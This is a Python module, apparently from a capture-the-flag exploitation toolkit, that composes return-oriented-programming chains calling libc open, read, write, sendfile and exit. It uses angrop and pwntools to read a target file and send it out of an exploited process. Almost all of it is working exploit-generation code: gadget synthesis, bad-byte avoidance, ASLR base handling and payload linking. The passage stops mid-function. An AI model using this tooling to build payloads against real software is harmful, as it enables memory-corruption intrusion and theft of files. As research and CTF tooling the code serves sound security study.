"""Composable libc open/read/write/sendfile ROP call programs.

The return value of ``open`` is intentionally not treated as a magical data
flow edge.  Every exfiltration stage takes an explicit descriptor, making
programs such as ``open(path); sendfile(1, 3, NULL, n)`` honest and easy to
rearrange.  Each stage can also be lowered independently with concrete
``SemanticGadget`` records.

Automatic multi-call lowering uses the repository's vendored angrop source
against digest-checked ELF snapshots and explicit runtime load biases.
Pwntools remains the source of ELF, mitigation, symbol, and packing facts; its
ROP builder is retained only as an explicitly named compatibility path.
"""

from __future__ import annotations

import math
import os
import time
from collections.abc import Sequence
from contextlib import nullcontext
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import TYPE_CHECKING

from pwnlib.context import context
from pwnlib.exception import PwnlibException

from .libc import LibcImage
from .model import Address, Image, Payload, PayloadKind, RuntimeLayout
from .pwntools_compat import ExactELFAdapter, PwntoolsCompatibilityError, PwntoolsROPUnsupported
from .rop import (
    AddressExpression,
    AddressValue,
    ChainWord,
    LibcBoundAddress,
    ROPBuildError,
    ROPChain,
    SemanticGadget,
    bind_libc_address,
    build_call,
)
from .target import Target

if TYPE_CHECKING:
    from .angrop_backend import (
        AngropDirectCall,
        AngropDiscoveryOptions,
        AngropImageSpec,
        AngropSynthesisResult,
        PreparedAngropSession,
    )


class LibcROPError(ROPBuildError):
    """A libc call stage or composed program is invalid."""


class LibcROPStageKind(str, Enum):
    OPEN = "open"
    READ = "read"
    WRITE = "write"
    SENDFILE = "sendfile"
    EXIT = "exit"


def _target_key(target: Target) -> tuple[object, ...]:
    return (target.arch, target.bits, target.endian, target.abi, target.function_pointer_model)


def _check_address(value: object, description: str) -> None:
    if isinstance(value, bool) or not isinstance(value, (int, Address, AddressExpression, LibcBoundAddress)):
        raise TypeError(f"{description} must be an int or symbolic Address value")


def _add_address(value: AddressValue, offset: int) -> AddressValue:
    _check_address(value, "address")
    if not isinstance(offset, int) or isinstance(offset, bool) or offset < 0:
        raise ValueError("address offset must be a non-negative integer")
    if offset == 0:
        return value
    if isinstance(value, int):
        return value + offset
    if isinstance(value, Address):
        return AddressExpression(value, offset)
    return value + offset


def _address_key(value: AddressValue) -> tuple[object, int, object | None]:
    """Normalize equivalent symbolic addresses without resolving ASLR bases."""

    if isinstance(value, int):
        return (Image.ABSOLUTE.value, value, None)
    if isinstance(value, LibcBoundAddress):
        return (Image.LIBC.value, value.offset + value.addend, value.identity)
    if isinstance(value, AddressExpression):
        image = value.base.image.value if isinstance(value.base.image, Image) else value.base.image
        return (image, value.base.value + value.addend, None)
    image = value.image.value if isinstance(value.image, Image) else value.image
    return (image, value.value, None)


def _same_address(left: AddressValue, right: AddressValue) -> bool:
    return _address_key(left) == _address_key(right)


def _resolve_address(value: AddressValue, layout: RuntimeLayout | None) -> int:
    if isinstance(value, int):
        return value
    return value.resolve(layout)


def _is_libc_relative(value: AddressValue) -> bool:
    if isinstance(value, LibcBoundAddress):
        return True
    if isinstance(value, AddressExpression):
        value = value.base
    return isinstance(value, Address) and (value.image is Image.LIBC or value.image == Image.LIBC.value)


def _require_exact_value(libc: LibcImage, value: AddressValue, description: str) -> None:
    _check_address(value, description)
    if isinstance(value, LibcBoundAddress):
        if value.identity != libc.identity:
            raise LibcROPError(f"{description} belongs to a different exact libc artifact")
    elif _is_libc_relative(value):
        raise LibcROPError(f"{description} is libc-relative but lacks exact LibcIdentity binding")


def _checked_word(target: Target, value: int, description: str, *, positive: bool = False) -> int:
    if isinstance(value, bool) or not isinstance(value, int):
        raise TypeError(f"{description} must be an int")
    if value < (1 if positive else 0):
        qualifier = "positive" if positive else "non-negative"
        raise ValueError(f"{description} must be {qualifier}")
    target.pack(value)
    return value


def _align_up(value: int, alignment: int) -> int:
    return (value + alignment - 1) & -alignment


def _normalized_bad_bytes(values: Sequence[int]) -> frozenset[int]:
    if isinstance(values, str):
        raise TypeError("bad_bytes must be bytes or a sequence of byte integers")
    try:
        normalized = tuple(values)
    except TypeError as exc:
        raise TypeError("bad_bytes must be bytes or a sequence of byte integers") from exc
    for value in normalized:
        if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value <= 0xFF:
            raise ValueError("bad_bytes entries must be integers in range(256)")
    return frozenset(normalized)


def _next_safe_inline_offset(
    target: Target,
    chain_base: int,
    minimum: int,
    alignment: int,
    forbidden: frozenset[int],
) -> int:
    """Find nearby aligned padding whose concrete inline pointer is encodable."""

    candidate = _align_up(minimum, alignment)
    search_end = min(target.mask - chain_base, candidate + 0x10000)
    while candidate <= search_end:
        if not forbidden.intersection(target.pack(chain_base + candidate)):
            return candidate
        candidate += alignment
    raise LibcROPError(
        "no bad-byte-free inline path pointer exists within 64 KiB of the minimal aligned placement; "
        "choose another chain_base or an external path_address"
    )


@dataclass(frozen=True, slots=True)
class InlineDataReference:
    """A stage argument relocated to tagged data appended to the ROP chain."""

    tag: str

    def __post_init__(self) -> None:
        if not isinstance(self.tag, str) or not self.tag:
            raise ValueError("inline-data tags must be non-empty strings")


StageArgument = AddressValue | InlineDataReference


@dataclass(frozen=True, slots=True)
class WritableArea:
    """Caller-provided writable storage used for the path and/or ORW buffer."""

    address: AddressValue
    size: int | None = None

    def __post_init__(self) -> None:
        _check_address(self.address, "writable-area address")
        if self.size is not None and (isinstance(self.size, bool) or not isinstance(self.size, int) or self.size <= 0):
            raise ValueError("writable-area size must be a positive integer or None")


@dataclass(frozen=True, slots=True)
class DataPlacement:
    """Bytes the caller must place at a symbolic external address."""

    address: AddressValue
    data: bytes
    purpose: str

    def __post_init__(self) -> None:
        _check_address(self.address, "data-placement address")
        if not isinstance(self.data, bytes) or not self.data:
            raise ValueError("data placements require non-empty bytes")
        if not isinstance(self.purpose, str) or not self.purpose:
            raise ValueError("data-placement purpose must be a non-empty string")

    def resolved_address(self, layout: RuntimeLayout | None = None) -> int:
        return _resolve_address(self.address, layout)


@dataclass(frozen=True, slots=True)
class LibcROPStage:
    """One exact-libc function call, independent from neighboring stages."""

    libc: LibcImage
    operation: LibcROPStageKind
    symbol: str
    arguments: tuple[StageArgument, ...]

    def __post_init__(self) -> None:
        if not isinstance(self.operation, LibcROPStageKind):
            object.__setattr__(self, "operation", LibcROPStageKind(self.operation))
        object.__setattr__(self, "arguments", tuple(self.arguments))
        if not self.symbol:
            raise ValueError("libc stage symbol cannot be empty")
        self.libc.offset(self.symbol)
        for index, argument in enumerate(self.arguments):
            if isinstance(argument, InlineDataReference):
                continue
            _require_exact_value(self.libc, argument, f"argument {index}")

    @property
    def function(self) -> LibcBoundAddress:
        return bind_libc_address(self.libc, self.symbol)

    def resolve_arguments(
        self,
        *,
        inline_addresses: dict[str, AddressValue] | None = None,
    ) -> tuple[AddressValue, ...]:
        resolved: list[AddressValue] = []
        addresses = inline_addresses or {}
        for argument in self.arguments:
            if isinstance(argument, InlineDataReference):
                try:
                    resolved.append(addresses[argument.tag])
                except KeyError as exc:
                    raise LibcROPError(f"inline data {argument.tag!r} has no assigned address") from exc
            else:
                resolved.append(argument)
        return tuple(resolved)

    def lower_semantic(
        self,
        *,
        gadgets: Sequence[SemanticGadget] = (),
        return_to: AddressValue | None = 0,
        inline_addresses: dict[str, AddressValue] | None = None,
        filler: AddressValue = 0,
    ) -> ROPChain:
        """Lower this call using explicit gadget semantics for its exact target."""

        if return_to is not None:
            _require_exact_value(self.libc, return_to, "return address")
        _require_exact_value(self.libc, filler, "filler")
        for gadget in gadgets:
            _require_exact_value(self.libc, gadget.address, f"gadget {gadget.description!r}")
            for slot, value in gadget.fixed_slots.items():
                raw = value.value if isinstance(value, ChainWord) else value
                _require_exact_value(self.libc, raw, f"gadget {gadget.description!r} fixed slot {slot}")
        arguments = self.resolve_arguments(inline_addresses=inline_addresses)
        return build_call(
            self.libc.target,
            self.function,
            arguments,
            gadgets=gadgets,
            return_to=return_to,
            filler=filler,
            prepare_abi_function_address=True,
            description=(f"libc {self.operation.value} stage via {self.symbol} from {self.libc.identity.sha256[:12]}"),
            kind=PayloadKind.RET2LIBC,
        )


@dataclass(frozen=True, slots=True)
class LoweredLibcROP:
    """Concrete linked ROP bytes plus relocation and provenance metadata."""

    program: LibcROPProgram
    chain: bytes
    data: bytes
    chain_base: int
    inline_path_offset: int | None
    backend: str = "angrop"
    backend_result: AngropSynthesisResult | None = None

    @property
    def inline_path_address(self) -> int | None:
        if self.inline_path_offset is None:
            return None
        return self.chain_base + self.inline_path_offset

    @property
    def inline_path_reference(self) -> Address | None:
        if self.inline_path_offset is None:
            return None
        assert self.inline_path_address is not None
        return Address(self.inline_path_address, Image.ABSOLUTE, "placement-bound inline libc ORW path")

    def as_payload(self) -> Payload:
        backend_metadata = None if self.backend_result is None else dict(self.backend_result.as_payload().metadata)
        return Payload(
            self.data,
            self.program.target,
            PayloadKind.RET2LIBC,
            f"composed libc ROP program using {self.program.libc.identity.sha256[:12]}",
            metadata={
                "libc_sha256": self.program.libc.identity.sha256,
                "libc_build_id": self.program.libc.identity.build_id,
                "operations": tuple(stage.operation.value for stage in self.program.stages),
                "rop_backend": self.backend,
                "rop_backend_metadata": backend_metadata,
                "chain_size": len(self.chain),
                "inline_path_offset": self.inline_path_offset,
                "external_placements": tuple(
                    {
                        "address": placement.address,
                        "size": len(placement.data),
                        "purpose": placement.purpose,
                    }
                    for placement in self.program.external_placements
                ),
            },
            required_load_address=self.chain_base,
        )


@dataclass(frozen=True, slots=True)
class LibcROPProgram:
    """An ordered, exact-libc call program with explicit data placements."""

    libc: LibcImage
    adapter: ExactELFAdapter
    stages: tuple[LibcROPStage, ...]
    path_data: bytes
    inline_path: bool
    external_placements: tuple[DataPlacement, ...] = ()

    def __post_init__(self) -> None:
        object.__setattr__(self, "stages", tuple(self.stages))
        object.__setattr__(self, "external_placements", tuple(self.external_placements))
        if not self.stages:
            raise LibcROPError("a composed libc ROP program needs at least one stage")
        if self.adapter.identity != self.libc.identity:
            raise LibcROPError("pwntools adapter and LibcImage identities differ")
        if _target_key(self.adapter.target) != _target_key(self.libc.target):
            raise LibcROPError("pwntools adapter and LibcImage targets differ")
        for stage in self.stages:
            if stage.libc.identity != self.libc.identity:
                raise LibcROPError("cannot compose stages from different libc artifacts")
            if _target_key(stage.libc.target) != _target_key(self.libc.target):
                raise LibcROPError("cannot compose stages for different targets")

    @property
    def target(self) -> Target:
        return self.libc.target

    @property
    def operations(self) -> tuple[LibcROPStageKind, ...]:
        return tuple(stage.operation for stage in self.stages)

    def lower_stage(
        self,
        index: int,
        *,
        gadgets: Sequence[SemanticGadget] = (),
        return_to: AddressValue | None = 0,
        inline_path_address: AddressValue | None = None,
        filler: AddressValue = 0,
    ) -> ROPChain:
        """Independently lower one stage for any supported direct-call ABI."""

        if isinstance(index, bool) or not isinstance(index, int):
            raise TypeError("stage index must be an int")
        stage = self.stages[index]
        inline: dict[str, AddressValue] = {}
        needs_path = any(
            isinstance(argument, InlineDataReference) and argument.tag == "path" for argument in stage.arguments
        )
        if needs_path:
            if inline_path_address is None:
                raise LibcROPError("an inline_path_address is required for independent stage lowering")
            _require_exact_value(self.libc, inline_path_address, "inline path address")
            inline["path"] = inline_path_address
        return stage.lower_semantic(
            gadgets=gadgets,
            return_to=return_to,
            inline_addresses=inline,
            filler=filler,
        )

    def angrop_calls(
        self,
        layout: RuntimeLayout,
        inline_path_address: int | None,
        *,
        continuation: AddressValue | None = None,
    ) -> tuple[AngropDirectCall, ...]:
        """Resolve the stage IR for direct use with a prepared angrop session.

        ``continuation`` adds a final argument-less direct transfer after the
        last stage returns.  This makes a standalone ``open`` payload useful
        when a challenge needs to regain control before a separately generated
        exfiltration payload hardcodes the observed descriptor.
        """

        from .angrop_backend import AngropDirectCall

        if not isinstance(layout, RuntimeLayout):
            raise TypeError("layout must be a RuntimeLayout")
        if continuation is not None:
            _require_exact_value(self.libc, continuation, "angrop continuation")
            if self.stages[-1].operation is LibcROPStageKind.EXIT:
                raise LibcROPError("an exit stage cannot return to an angrop continuation")
        inline = {"path": inline_path_address} if inline_path_address is not None else {}
        calls: list[AngropDirectCall] = []
        final_index = len(self.stages) - 1
        for index, stage in enumerate(self.stages):
            function = stage.function.resolve(layout)
            arguments = tuple(
                _resolve_address(value, layout) for value in stage.resolve_arguments(inline_addresses=inline)
            )
            calls.append(
                AngropDirectCall(
                    function,
                    arguments=arguments,
                    name=f"{index}:{stage.operation.value}:{stage.symbol}",
                    needs_return=index != final_index or continuation is not None,
                )
            )
        if continuation is not None:
            calls.append(
                AngropDirectCall(
                    _resolve_address(continuation, layout),
                    name="continuation",
                    needs_return=False,
                )
            )
        return tuple(calls)

    def _angrop_calls(
        self,
        layout: RuntimeLayout,
        inline_path_address: int | None,
        *,
        continuation: AddressValue | None = None,
    ) -> tuple[AngropDirectCall, ...]:
        """Compatibility alias for the now-public :meth:`angrop_calls`."""

        return self.angrop_calls(layout, inline_path_address, continuation=continuation)

    def lower_angrop(
        self,
        layout: RuntimeLayout,
        *,
        chain_base: int,
        inline_alignment: int | None = None,
        extra_images: Sequence[AngropImageSpec] = (),
        scan_libc_gadgets: bool = True,
        bad_bytes: Sequence[int] = (),
        options: AngropDiscoveryOptions | None = None,
        timeout: float | None = None,
        continuation: AddressValue | None = None,
        session: PreparedAngropSession | None = None,
    ) -> LoweredLibcROP:
        """Synthesize all calls with vendored angrop over exact runtime images.

        The program's libc is always included using ``layout.libc_base``.
        Every supplemental image is an :class:`AngropImageSpec` carrying its
        own explicit additive load bias; a zero bias is still explicit for a
        linked non-PIE executable.  Set ``scan_libc_gadgets=False`` when the
        supplied challenge image is the intended gadget source.

        ``timeout`` is one shared deadline for call synthesis and inline-data
        fixed-point retries only.  Gadget discovery has its own independent
        :attr:`AngropDiscoveryOptions.timeout` budget.

        ``continuation`` makes the final program stage return and appends one
        terminal direct transfer to the resolved address.  It is invalid after
        an ``exit`` stage.  Repeated variants can pass the same public
        :class:`PreparedAngropSession` as ``session=``; the caller retains
        ownership.  :meth:`angrop_calls` remains available for direct use with
        the session's lower-level ``synthesize_calls()`` method.
        """

        from .angrop_backend import (
            AngropBackendError,
            AngropDiscoveryOptions,
            AngropImageSpec,
            PreparedAngropSession,
            prepare_angrop,
        )

        if not isinstance(layout, RuntimeLayout):
            raise TypeError("layout must be a RuntimeLayout")
        if layout.libc_base is None:
            raise LibcROPError("angrop lowering needs the exact runtime libc base (its additive load bias)")
        if isinstance(chain_base, bool) or not isinstance(chain_base, int):
            raise TypeError("chain_base must be an int")
        if not 0 <= chain_base <= self.target.mask:
            raise ValueError("chain_base does not fit the target address width")
        if not isinstance(scan_libc_gadgets, bool):
            raise TypeError("scan_libc_gadgets must be bool")
        alignment = self.target.word_size if inline_alignment is None else inline_alignment
        if (
            isinstance(alignment, bool)
            or not isinstance(alignment, int)
            or alignment <= 0
            or alignment & (alignment - 1)
        ):
            raise ValueError("inline_alignment must be a positive power of two")
        forbidden = _normalized_bad_bytes(bad_bytes)
        if self.inline_path:
            path_conflict = next((index for index, value in enumerate(self.path_data) if value in forbidden), None)
            if path_conflict is not None:
                raise LibcROPError(
                    f"bad byte {self.path_data[path_conflict]:#04x} occurs in inline path data at offset "
                    f"{path_conflict:#x}"
                )
        normalized_images = tuple(extra_images)
        for index, image in enumerate(normalized_images):
            if not isinstance(image, AngropImageSpec):
                raise TypeError(f"extra image {index} must be an AngropImageSpec with an explicit load_bias")
        if options is not None and not isinstance(options, AngropDiscoveryOptions):
            raise TypeError("options must be an AngropDiscoveryOptions or None")
        if timeout is not None and (
            isinstance(timeout, bool)
            or not isinstance(timeout, (int, float))
            or timeout <= 0
            or not math.isfinite(timeout)
        ):
            raise ValueError("timeout must be a positive finite number or None")
        if continuation is not None:
            _require_exact_value(self.libc, continuation, "angrop continuation")
            if self.stages[-1].operation is LibcROPStageKind.EXIT:
                raise LibcROPError("an exit stage cannot return to an angrop continuation")

        synthesis_deadline: float | None = None

        def remaining_timeout() -> float | None:
            if synthesis_deadline is None:
                return None
            remaining = synthesis_deadline - time.monotonic()
            if remaining <= 0:
                raise LibcROPError(f"angrop synthesis exceeded its {timeout:g}-second deadline")
            return remaining

        primary = AngropImageSpec.from_adapter(
            self.adapter,
            load_bias=layout.libc_base,
            name="libc",
            scan_gadgets=scan_libc_gadgets,
        )
        requested_images = (primary, *normalized_images)
        if session is None:
            try:
                session_context = prepare_angrop(
                    requested_images,
                    target=self.target,
                    options=options or AngropDiscoveryOptions(),
                )
            except AngropBackendError as exc:
                raise LibcROPError(f"angrop cannot prepare the composed program: {exc}") from exc
        else:
            if not isinstance(session, PreparedAngropSession):
                raise TypeError("session must be a PreparedAngropSession or None")
            if session.closed:
                raise LibcROPError("the supplied angrop session is closed")
            if _target_key(session.target) != _target_key(self.target):
                raise LibcROPError("the supplied angrop session targets a different ABI")

            def image_key(image: AngropImageSpec) -> tuple[object, ...]:
                return (
                    image.identity.sha256,
                    image.identity.build_id,
                    image.load_bias,
                    image.scan_gadgets,
                    _target_key(image.target),
                )

            if tuple(map(image_key, session.images)) != tuple(map(image_key, requested_images)):
                raise LibcROPError("the supplied angrop session does not contain the requested exact runtime images")
            if options is not None and session.options != options:
                raise LibcROPError("the supplied angrop session uses different discovery options")
            session_context = nullcontext(session)
        try:
            with session_context as prepared:
                # Discovery has its own AngropDiscoveryOptions timeout.  This
                # budget covers every fixed-point synthesis attempt together.
                synthesis_deadline = None if timeout is None else time.monotonic() + timeout
                if not self.inline_path:
                    result = prepared.synthesize_calls(
                        self.angrop_calls(layout, None, continuation=continuation),
                        chain_base=chain_base,
                        bad_bytes=forbidden,
                        timeout=remaining_timeout(),
                    )
                    chain = result.data
                    if chain_base + len(chain) > self.target.mask + 1:
                        raise LibcROPError("ROP chain exceeds the target address space")
                    return LoweredLibcROP(
                        self,
                        chain,
                        chain,
                        chain_base,
                        None,
                        backend="angrop",
                        backend_result=result,
                    )

                # Bad-byte-aware gadget selection can change the chain length.
                # Seed placement without those constraints so a forbidden byte
                # in the temporary pointer cannot prevent finding the fixed
                # point that would have avoided it.
                inline_offset = 0
                if forbidden:
                    seed = prepared.synthesize_calls(
                        self.angrop_calls(layout, chain_base, continuation=continuation),
                        chain_base=chain_base,
                        bad_bytes=(),
                        timeout=remaining_timeout(),
                    )
                    inline_offset = _next_safe_inline_offset(
                        self.target,
                        chain_base,
                        len(seed.data),
                        alignment,
                        forbidden,
                    )

                seen_offsets: set[int] = set()
                result = None
                chain = b""
                for _ in range(8):
                    pointer = chain_base + inline_offset
                    if pointer > self.target.mask:
                        raise LibcROPError("inline path address exceeds the target address space")
                    result = prepared.synthesize_calls(
                        self.angrop_calls(layout, pointer, continuation=continuation),
                        chain_base=chain_base,
                        bad_bytes=forbidden,
                        timeout=remaining_timeout(),
                    )
                    chain = result.data
                    updated = _next_safe_inline_offset(
                        self.target,
                        chain_base,
                        len(chain),
                        alignment,
                        forbidden,
                    )
                    if updated == inline_offset:
                        break
                    if updated in seen_offsets:
                        raise LibcROPError("angrop inline-data placement entered a length cycle")
                    seen_offsets.add(inline_offset)
                    inline_offset = updated
                else:
                    raise LibcROPError("angrop inline-data placement did not converge")

                assert result is not None  # every valid program executes at least one iteration
                padding = bytes(inline_offset - len(chain))
                data = chain + padding + self.path_data
                if chain_base + len(data) > self.target.mask + 1:
                    raise LibcROPError("ROP chain and inline path exceed the target address space")
                conflict = next((index for index, value in enumerate(data) if value in forbidden), None)
                if conflict is not None:
                    raise LibcROPError(f"bad byte {data[conflict]:#04x} occurs at linked payload offset {conflict:#x}")
                return LoweredLibcROP(
                    self,
                    chain,
                    data,
                    chain_base,
                    inline_offset,
                    backend="angrop",
                    backend_result=result,
                )
        except AngropBackendError as exc:
            raise LibcROPError(f"angrop cannot lower the composed program: {exc}") from exc

    def lower(
        self,
        layout: RuntimeLayout,
        *,
        chain_base: int,
        inline_alignment: int | None = None,
        extra_images: Sequence[AngropImageSpec] = (),
        scan_libc_gadgets: bool = True,
        bad_bytes: Sequence[int] = (),
        options: AngropDiscoveryOptions | None = None,
        timeout: float | None = None,
        continuation: AddressValue | None = None,
        session: PreparedAngropSession | None = None,
    ) -> LoweredLibcROP:
        """Use the primary automatic ROP backend (vendored angrop)."""

        return self.lower_angrop(
            layout,
            chain_base=chain_base,
            inline_alignment=inline_alignment,
            extra_images=extra_images,
            scan_libc_gadgets=scan_libc_gadgets,
            bad_bytes=bad_bytes,
            options=options,
            timeout=timeout,
            continuation=continuation,
            session=session,
        )

    def _pwntools_chain(
        self,
        layout: RuntimeLayout,
        chain_base: int,
        inline_path_address: int | None,
        extra_images: Sequence[tuple[ExactELFAdapter, int | None]],
    ) -> bytes:
        if layout.libc_base is None:
            raise LibcROPError("pwntools lowering needs the exact runtime libc base")
        try:
            images, rop = self.adapter.fresh_rop_group(
                runtime_base=layout.libc_base,
                extra_images=extra_images,
            )
        except (PwntoolsCompatibilityError, PwntoolsROPUnsupported) as exc:
            raise LibcROPError(str(exc)) from exc
        elf = images[0]

        inline = {"path": inline_path_address} if inline_path_address is not None else {}
        try:
            with context.local(
                arch=self.target.pwntools_arch,
                bits=self.target.bits,
                endian=self.target.endian.value,
                os=self.target.os,
                log_level="error",
            ):
                for stage in self.stages:
                    arguments = tuple(
                        _resolve_address(value, layout) for value in stage.resolve_arguments(inline_addresses=inline)
                    )
                    try:
                        function = int(elf.symbols[stage.symbol])
                    except KeyError as exc:  # guarded by LibcImage, kept for adapter drift
                        raise LibcROPError(f"pwntools cannot resolve exact symbol {stage.symbol!r}") from exc
                    try:
                        rop.call(function, arguments)
                    except PwnlibException as exc:
                        raise LibcROPError(
                            f"pwntools cannot encode {stage.operation.value} for {self.target.name}: {exc}"
                        ) from exc
                try:
                    return bytes(rop.chain(base=chain_base))
                except PwnlibException as exc:
                    raise LibcROPError(
                        f"pwntools cannot link the composed calls for {self.target.name}: {exc}"
                    ) from exc
        finally:
            for image in images:
                image.close()

    def lower_pwntools(
        self,
        layout: RuntimeLayout,
        *,
        chain_base: int,
        inline_alignment: int | None = None,
        extra_images: Sequence[tuple[ExactELFAdapter, int | None]] = (),
    ) -> LoweredLibcROP:
        """Link all calls with pwntools on verified i386/AMD64 targets.

        ``extra_images`` adds exact, digest-checked ELF artifacts to
        pwntools' gadget search space.  This normally contains the challenge
        executable: libc supplies the called functions while the main image
        supplies register loaders or i386 stack-cleanup gadgets.  Use a
        ``None`` base for a linked non-PIE image and an observed base for PIE.
        """

        if not isinstance(layout, RuntimeLayout):
            raise TypeError("layout must be a RuntimeLayout")
        if isinstance(chain_base, bool) or not isinstance(chain_base, int):
            raise TypeError("chain_base must be an int")
        if not 0 <= chain_base <= self.target.mask:
            raise ValueError("chain_base does not fit the target address width")
        alignment = self.target.word_size if inline_alignment is None else inline_alignment
        normalized_images = tuple(extra_images)
        if (
            isinstance(alignment, bool)
            or not isinstance(alignment, int)
            or alignment <= 0
            or alignment & (alignment - 1)
        ):
            raise ValueError("inline_alignment must be a positive power of two")

        if not self.inline_path:
            chain = self._pwntools_chain(layout, chain_base, None, normalized_images)
            return LoweredLibcROP(self, chain, chain, chain_base, None, backend="pwntools-compat")

        # Gadget selection depends on the register set, not the pointer value,
        # but use a bounded fixed point so that a backend change cannot silently
        # invalidate the tagged inline-data address.
        inline_offset = 0
        chain = b""
        for _ in range(4):
            pointer = chain_base + inline_offset
            if pointer > self.target.mask:
                raise LibcROPError("inline path address exceeds the target address space")
            chain = self._pwntools_chain(layout, chain_base, pointer, normalized_images)
            updated = _align_up(len(chain), alignment)
            if updated == inline_offset:
                break
            inline_offset = updated
        else:  # pragma: no cover - pwntools call frames have fixed word counts
            raise LibcROPError("pwntools inline-data placement did not converge")

        padding = bytes(inline_offset - len(chain))
        data = chain + padding + self.path_data
        return LoweredLibcROP(self, chain, data, chain_base, inline_offset, backend="pwntools-compat")

    def materialize(
        self,
        layout: RuntimeLayout,
        *,
        chain_base: int,
        inline_alignment: int | None = None,
        extra_images: Sequence[AngropImageSpec] = (),
        scan_libc_gadgets: bool = True,
        bad_bytes: Sequence[int] = (),
        options: AngropDiscoveryOptions | None = None,
        timeout: float | None = None,
        continuation: AddressValue | None = None,
        session: PreparedAngropSession | None = None,
    ) -> bytes:
        return self.lower(
            layout,
            chain_base=chain_base,
            inline_alignment=inline_alignment,
            extra_images=extra_images,
            scan_libc_gadgets=scan_libc_gadgets,
            bad_bytes=bad_bytes,
            options=options,
            timeout=timeout,
            continuation=continuation,
            session=session,
        ).data


@dataclass(frozen=True, slots=True)
class LibcROPBuilder:
    """Factory for independent stages tied to one exact libc and file path."""

    libc: LibcImage
    adapter: ExactELFAdapter
    path_data: bytes
    writable_area: WritableArea | None
    path_address: AddressValue | InlineDataReference
    buffer_address: AddressValue | None
    external_placements: tuple[DataPlacement, ...]

    @classmethod
    def from_file(
        cls,
        libc_path: str | Path,
        file_path: str | bytes | os.PathLike[str],
        *,
        writable_area: AddressValue | WritableArea | None = None,
        writable_size: int | None = None,
        path_address: AddressValue | None = None,
        target: Target | None = None,
    ) -> LibcROPBuilder:
        artifact = Path(libc_path).resolve(strict=True)
        libc = LibcImage.from_file(artifact)
        adapter = ExactELFAdapter.from_file(
            artifact,
            expected_identity=libc.identity,
            expected_target=target or libc.target,
        )
        if adapter.identity.sha256 != libc.identity.sha256 or adapter.identity.build_id != libc.identity.build_id:
            raise LibcROPError("pwntools and LibcImage do not identify the same exact artifact")

        if isinstance(file_path, bytes):
            encoded = file_path
        else:
            encoded = os.fsencode(file_path)
        if not encoded:
            raise ValueError("file path cannot be empty")
        if b"\0" in encoded:
            raise ValueError("file path cannot contain NUL bytes")
        encoded += b"\0"

        if isinstance(writable_area, WritableArea):
            if writable_size is not None:
                raise ValueError("writable_size cannot accompany a WritableArea object")
            area = writable_area
        elif writable_area is None:
            if writable_size is not None:
                raise ValueError("writable_size requires writable_area")
            area = None
        else:
            area = WritableArea(writable_area, writable_size)
        if area is not None:
            _require_exact_value(libc, area.address, "writable-area address")
        if path_address is not None:
            _require_exact_value(libc, path_address, "path address")

        path_reservation = _align_up(len(encoded), libc.target.word_size)
        path_uses_area = area is not None and (path_address is None or _same_address(path_address, area.address))
        if path_uses_area and area is not None and area.size is not None and path_reservation > area.size:
            raise LibcROPError("aligned path reservation exceeds the declared writable area")

        placements: tuple[DataPlacement, ...]
        if path_address is not None:
            selected_path: AddressValue | InlineDataReference = path_address
            placements = (DataPlacement(path_address, encoded, "libc open path"),)
            if area is not None and _same_address(path_address, area.address):
                selected_buffer = _add_address(area.address, path_reservation)
            else:
                selected_buffer = area.address if area is not None else None
        elif area is not None:
            selected_path = area.address
            placements = (DataPlacement(area.address, encoded, "libc open path"),)
            selected_buffer = _add_address(area.address, path_reservation)
        else:
            selected_path = InlineDataReference("path")
            placements = ()
            selected_buffer = None

        return cls(
            libc,
            adapter,
            encoded,
            area,
            selected_path,
            selected_buffer,
            placements,
        )

    @property
    def target(self) -> Target:
        return self.libc.target

    def _symbol(self, symbol: str) -> str:
        if not isinstance(symbol, str) or not symbol:
            raise ValueError("libc symbol must be a non-empty string")
        self.libc.offset(symbol)
        return symbol

    def open(self, *, flags: int = 0, mode: int = 0, symbol: str = "open") -> LibcROPStage:
        return LibcROPStage(
            self.libc,
            LibcROPStageKind.OPEN,
            self._symbol(symbol),
            (
                self.path_address,
                _checked_word(self.target, flags, "open flags"),
                _checked_word(self.target, mode, "open mode"),
            ),
        )

    def _buffer(self, offset: int, count: int) -> AddressValue:
        if self.buffer_address is None or self.writable_area is None:
            raise LibcROPError("read/write stages require a writable area; sendfile does not")
        if isinstance(offset, bool) or not isinstance(offset, int) or offset < 0:
            raise ValueError("buffer offset must be a non-negative integer")
        _checked_word(self.target, count, "byte count", positive=True)
        path_reservation = (
            _align_up(len(self.path_data), self.target.word_size)
            if _same_address(self.path_address, self.writable_area.address)
            else 0
        )
        if self.writable_area.size is not None and path_reservation + offset + count > self.writable_area.size:
            raise LibcROPError("read/write range exceeds the declared writable area")
        return _add_address(self.buffer_address, offset)

    def read(
        self,
        fd: int,
        count: int,
        *,
        buffer_offset: int = 0,
        symbol: str = "read",
    ) -> LibcROPStage:
        return LibcROPStage(
            self.libc,
            LibcROPStageKind.READ,
            self._symbol(symbol),
            (
                _checked_word(self.target, fd, "read file descriptor"),
                self._buffer(buffer_offset, count),
                count,
            ),
        )

    def write(
        self,
        fd: int,
        count: int,
        *,
        buffer_offset: int = 0,
        symbol: str = "write",
    ) -> LibcROPStage:
        return LibcROPStage(
            self.libc,
            LibcROPStageKind.WRITE,
            self._symbol(symbol),
            (
                _checked_word(self.target, fd, "write file descriptor"),
                self._buffer(buffer_offset, count),
                count,
            ),
        )

    def sendfile(
        self,
        out_fd: int,
        in_fd: int,
        count: int,
        *,
        offset_pointer: AddressValue = 0,
        symbol: str = "sendfile",
    ) -> LibcROPStage:
        _require_exact_value(self.libc, offset_pointer, "sendfile offset pointer")
        return LibcROPStage(
            self.libc,
            LibcROPStageKind.SENDFILE,
            self._symbol(symbol),
            (
                _checked_word(self.target, out_fd, "sendfile output descriptor"),
                _checked_word(self.target, in_fd, "sendfile input descriptor"),
                offset_pointer,
                _checked_word(self.target, count, "sendfile byte count", positive=True),
            ),
        )

    def exit(self, status: int = 0, *, symbol: str = "exit") -> LibcROPStage:
        return LibcROPStage(
            self.libc,
            LibcROPStageKind.EXIT,
            self._symbol(symbol),
            (_checked_word(self.target, status, "exit status"),),
        )

    def compose(self, *stages: LibcROPStage | Sequence[LibcROPStage]) -> LibcROPProgram:
        if len(stages) == 1 and not isinstance(stages[0], LibcROPStage):
            normalized = tuple(stages[0])
        else:
            normalized = tuple(stages)  # type: ignore[arg-type]
        if any(not isinstance(stage, LibcROPStage) for stage in normalized):
            raise TypeError("compose expects LibcROPStage records")

        open_path_arguments = tuple(
